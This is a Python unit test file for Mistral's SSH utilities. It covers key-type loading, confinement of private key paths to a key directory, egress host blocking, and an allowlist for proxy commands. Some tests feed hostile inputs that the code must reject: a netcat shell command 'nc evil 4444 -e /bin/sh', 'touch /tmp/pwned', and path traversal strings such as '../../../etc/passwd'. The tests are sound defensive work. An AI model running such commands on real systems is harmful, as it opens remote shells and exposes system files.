# Copyright 2025 - OVH SAS
#
#    Licensed under the Apache License, Version 2.0 (the "License");
#    you may not use this file except in compliance with the License.
#    You may obtain a copy of the License at
#
#        http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS,
#    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#    See the License for the specific language governing permissions and
#    limitations under the License.

import io
import os
import shutil
import subprocess
import tempfile
import unittest
from unittest import mock

import fixtures
from paramiko.ecdsakey import ECDSAKey
from paramiko.ed25519key import Ed25519Key
from paramiko.rsakey import RSAKey
from paramiko.ssh_exception import SSHException

from mistral import exceptions as exc
from mistral.tests.unit import base
from mistral.utils import egress
from mistral.utils import ssh_utils


class SSHUtilsTest(base.BaseTest):
    """Tests for ssh_utils multi-key-type support (RSA, ECDSA, Ed25519)."""

    def test_to_paramiko_private_key_rsa_from_string(self):
        """RSA key passed as string is loaded successfully."""
        key = RSAKey.generate(2048)
        buf = io.StringIO()
        key.write_private_key(buf)
        key_pem = buf.getvalue()

        result = ssh_utils._to_paramiko_private_key(
            private_key_filename=None,
            private_key=key_pem,
        )

        self.assertIsNotNone(result)
        self.assertIsInstance(result, RSAKey)

    def test_to_paramiko_private_key_ecdsa_from_string(self):
        """ECDSA key passed as string is loaded successfully."""
        key = ECDSAKey.generate()
        buf = io.StringIO()
        key.write_private_key(buf)
        key_pem = buf.getvalue()

        result = ssh_utils._to_paramiko_private_key(
            private_key_filename=None,
            private_key=key_pem,
        )

        self.assertIsNotNone(result)
        self.assertIsInstance(result, ECDSAKey)

    @unittest.skipUnless(shutil.which('ssh-keygen'),
                         'ssh-keygen not available')
    def test_to_paramiko_private_key_ed25519_from_string(self):
        """Ed25519 key passed as string is loaded."""
        with tempfile.TemporaryDirectory() as tmpdir:
            key_path = os.path.join(tmpdir, 'id_ed25519')
            subprocess.run(
                ['ssh-keygen', '-t', 'ed25519', '-f',
                 key_path, '-N', '', '-q'],
                check=True,
                capture_output=True,
            )
            with open(key_path) as f:
                key_pem = f.read()

        result = ssh_utils._to_paramiko_private_key(
            private_key_filename=None,
            private_key=key_pem,
        )

        self.assertIsNotNone(result)
        self.assertIsInstance(result, Ed25519Key)

    def test_to_paramiko_private_key_tries_rsa_then_ecdsa_then_ed25519(self):
        """Key types are tried in order; first success is returned."""
        with mock.patch.object(RSAKey, 'from_private_key') as rsa_from:
            with mock.patch.object(ECDSAKey, 'from_private_key') as ecdsa_from:
                with mock.patch.object(Ed25519Key,
                                       'from_private_key') as ed_from:
                    rsa_from.side_effect = SSHException('not RSA')
                    ecdsa_from.side_effect = SSHException('not ECDSA')
                    fake_key = mock.Mock()
                    ed_from.return_value = fake_key

                    result = ssh_utils._to_paramiko_private_key(
                        private_key_filename=None,
                        private_key='some-key-content',
                    )

                    self.assertIs(result, fake_key)
                    rsa_from.assert_called_once()
                    ecdsa_from.assert_called_once()
                    ed_from.assert_called_once()

    def test_to_paramiko_private_key_invalid_raises_last_exception(self):
        """When key is invalid for all types, the last exception is raised."""
        try:
            ssh_utils._to_paramiko_private_key(
                private_key_filename=None,
                private_key='not-a-valid-key',
            )
            self.fail('Expected SSHException or OSError to be raised')
        except (SSHException, OSError):
            pass

    def test_to_paramiko_private_key_rsa_from_file(self):
        """RSA key loaded from file via private_key_filename."""
        key_dir = self.useFixture(fixtures.TempDir()).path
        self.override_config('private_key_dir', key_dir,
                             group='action_std_ssh')
        RSAKey.generate(2048).write_private_key_file(
            os.path.join(key_dir, 'my_key')
        )

        result = ssh_utils._to_paramiko_private_key(
            private_key_filename='my_key',
        )

        self.assertIsInstance(result, RSAKey)

    def test_to_paramiko_private_key_no_key_returns_none(self):
        """When no key material is provided, None is returned."""
        result = ssh_utils._to_paramiko_private_key(
            private_key_filename=None,
            private_key=None,
        )

        self.assertIsNone(result)


class SSHPrivateKeyPathTest(base.BaseTest):
    def setUp(self):
        super(SSHPrivateKeyPathTest, self).setUp()

        self.tmp_dir = os.path.realpath(
            self.useFixture(fixtures.TempDir()).path
        )
        self.key_dir = os.path.join(self.tmp_dir, 'keys')
        os.mkdir(self.key_dir)

        self.override_config('private_key_dir', self.key_dir,
                             group='action_std_ssh')

    def _assert_rejected(self, filename):
        with mock.patch.object(RSAKey, 'from_private_key_file') as rsa_from:
            self.assertRaises(
                exc.DataAccessException,
                ssh_utils._to_paramiko_private_key,
                filename,
            )

            rsa_from.assert_not_called()

    def _assert_loaded_from(self, filename, expected_path):
        with mock.patch.object(RSAKey, 'from_private_key_file') as rsa_from:
            rsa_from.return_value = mock.Mock()

            ssh_utils._to_paramiko_private_key(
                private_key_filename=filename,
            )

            rsa_from.assert_called_once_with(
                filename=expected_path,
                password=None,
            )

    def test_plain_filename_is_resolved_in_key_dir(self):
        self._assert_loaded_from(
            'my_key',
            os.path.join(self.key_dir, 'my_key')
        )

    def test_subdirectory_of_key_dir_is_allowed(self):
        self._assert_loaded_from(
            'project/my_key',
            os.path.join(self.key_dir, 'project', 'my_key')
        )

    def test_absolute_path_inside_key_dir_is_allowed(self):
        key_path = os.path.join(self.key_dir, 'my_key')

        self._assert_loaded_from(key_path, key_path)

    def test_absolute_path_outside_key_dir_is_rejected(self):
        for filename in ('/etc/mistral/deploy_key',
                         os.path.join(self.tmp_dir, 'other_key')):
            self._assert_rejected(filename)

    def test_path_traversal_is_rejected(self):
        for filename in ('../../../etc/passwd', '../other_key',
                         'project/../../other_key'):
            self._assert_rejected(filename)

    def test_prefix_sibling_directory_is_rejected(self):
        os.mkdir(self.key_dir + '-other')

        self._assert_rejected('../keys-other/my_key')
        self._assert_rejected(self.key_dir + '-other/my_key')

    def test_symlink_escaping_key_dir_is_rejected(self):
        outside = os.path.join(self.tmp_dir, 'deploy_key')
        open(outside, 'w').close()
        os.symlink(outside, os.path.join(self.key_dir, 'link'))

        self._assert_rejected('link')

    def test_symlinked_key_dir_is_followed(self):
        link_dir = os.path.join(self.tmp_dir, 'link_dir')
        os.symlink(self.key_dir, link_dir)
        self.override_config('private_key_dir', link_dir,
                             group='action_std_ssh')

        self._assert_loaded_from(
            'my_key',
            os.path.join(self.key_dir, 'my_key')
        )

    def test_default_key_dir_is_home_ssh(self):
        self.override_config('private_key_dir', '~/.ssh',
                             group='action_std_ssh')

        self._assert_loaded_from(
            'my_key',
            os.path.join(
                os.path.realpath(os.path.expanduser('~/.ssh')), 'my_key'
            )
        )


@mock.patch.object(egress.socket, 'getaddrinfo',
                   return_value=[(None, None, None, '', ('127.0.0.1', 22))])
class SSHEgressTest(base.BaseTest):
    @mock.patch('mistral.utils.ssh_utils._connect')
    def test_execute_command_blocked_host(self, mock_connect, gai):
        self.assertRaises(
            exc.UrlNotAllowedException,
            ssh_utils.execute_command,
            'ls', 'localhost', 'user'
        )

        gai.assert_called_once_with('localhost', 22)
        mock_connect.assert_not_called()

    @mock.patch('paramiko.SSHClient')
    def test_execute_command_via_gateway_blocked_gateway(self, mock_client,
                                                         gai):
        self.assertRaises(
            exc.UrlNotAllowedException,
            ssh_utils.execute_command_via_gateway,
            'ls', 'target', 'user', None, 'localhost'
        )

        gai.assert_called_once_with('localhost', 22)
        mock_client.assert_not_called()

    @mock.patch.object(ssh_utils, '_cleanup')
    @mock.patch.object(ssh_utils, '_execute_command', return_value=(0, 'ok'))
    @mock.patch.object(ssh_utils, '_connect')
    @mock.patch('paramiko.SSHClient')
    def test_execute_command_via_gateway_host_not_resolved(self, mock_client,
                                                           *args):
        gai = args[-1]
        gai.return_value = [(None, None, None, '', ('203.0.113.10', 22))]

        ssh_utils.execute_command_via_gateway(
            'ls', 'target', 'user', None, 'gateway'
        )

        gai.assert_called_once_with('gateway', 22)

    @mock.patch('paramiko.ProxyCommand')
    @mock.patch('paramiko.SSHClient')
    def test_execute_command_via_gateway_proxy_command_skips_check(
            self, mock_client, mock_proxy_cmd, gai):
        self.override_config('allowed_proxy_commands', ['nc gateway 22'],
                             group='action_std_ssh')

        with mock.patch.object(ssh_utils, '_connect'), \
                mock.patch.object(ssh_utils, '_cleanup'), \
                mock.patch.object(ssh_utils, '_execute_command',
                                  return_value=(0, 'ok')):
            ssh_utils.execute_command_via_gateway(
                'ls', 'target', 'user', None, 'localhost',
                proxy_command='nc gateway 22'
            )

        gai.assert_not_called()

    @mock.patch('mistral.utils.ssh_utils._execute_command')
    @mock.patch('mistral.utils.ssh_utils._connect')
    def test_execute_command_allowed_host(self, mock_connect, mock_exec,
                                          gai):
        gai.return_value = [(None, None, None, '', ('203.0.113.10', 22))]
        mock_exec.return_value = (0, 'ok')

        ret = ssh_utils.execute_command('ls', 'example.com', 'user')

        self.assertEqual((0, 'ok'), ret)
        mock_connect.assert_called_once()


class SSHProxyCommandAllowlistTest(base.BaseTest):
    """The std.ssh_proxied proxy_command is an RCE vector.

    paramiko.ProxyCommand runs the string as a local subprocess on the
    executor before SSH auth, so execute_command_via_gateway must only
    run a proxy_command that an operator has explicitly allow-listed via
    [action_std_ssh] allowed_proxy_commands (empty by default).
    """

    @mock.patch('paramiko.ProxyCommand')
    def test_proxy_command_rejected_by_default(self, mock_proxy_cmd):
        # Default allowed_proxy_commands is empty: any value is rejected,
        # and no local subprocess is ever spawned.
        self.assertRaises(
            exc.ActionException,
            ssh_utils.execute_command_via_gateway,
            'ls', 'target', 'user', None, 'gateway',
            proxy_command='touch /tmp/pwned'
        )

        mock_proxy_cmd.assert_not_called()

    @mock.patch('paramiko.ProxyCommand')
    def test_proxy_command_not_in_allowlist_rejected(self, mock_proxy_cmd):
        self.override_config(
            'allowed_proxy_commands',
            ['nc gateway 22'],
            group='action_std_ssh'
        )

        self.assertRaises(
            exc.ActionException,
            ssh_utils.execute_command_via_gateway,
            'ls', 'target', 'user', None, 'gateway',
            proxy_command='nc evil 4444 -e /bin/sh'
        )

        mock_proxy_cmd.assert_not_called()

    @mock.patch('mistral.utils.ssh_utils._cleanup')
    @mock.patch('mistral.utils.ssh_utils._execute_command')
    @mock.patch('mistral.utils.ssh_utils._connect')
    @mock.patch('paramiko.SSHClient')
    @mock.patch('paramiko.ProxyCommand')
    def test_allow_listed_proxy_command_is_used(
            self, mock_proxy_cmd, mock_ssh_client, mock_connect,
            mock_exec, mock_cleanup):
        self.override_config(
            'allowed_proxy_commands',
            ['nc gateway 22'],
            group='action_std_ssh'
        )
        mock_exec.return_value = (0, 'ok')

        ret = ssh_utils.execute_command_via_gateway(
            'ls', 'target', 'user', None, 'gateway',
            proxy_command='nc gateway 22'
        )

        # The exact allow-listed command reaches paramiko.
        mock_proxy_cmd.assert_called_once_with('nc gateway 22')
        self.assertEqual((0, 'ok'), ret)

    @mock.patch('paramiko.SSHClient')
    def test_connect_does_not_use_implicit_keys(self, mock_ssh_client):
        ssh_utils._connect('host', 'user')

        kwargs = mock_ssh_client.return_value.connect.call_args.kwargs
        self.assertFalse(kwargs['look_for_keys'])
        self.assertFalse(kwargs['allow_agent'])
